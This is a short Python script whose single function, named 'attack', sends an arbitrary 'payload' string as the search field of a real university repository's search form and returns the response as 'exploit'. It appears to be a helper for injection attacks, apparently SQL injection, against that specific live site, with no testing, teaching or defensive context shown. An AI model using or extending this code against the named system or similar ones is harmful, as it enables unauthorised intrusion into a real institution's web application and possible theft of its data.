import requests

def attack(conn, query):
    payload = query
    data = {
        "pilih_kategory": "buku",
        "cari_data": payload
    }
    exploit = conn.post(url="http://repository.undiknas.ac.id/repository/search", data=data)
    return exploit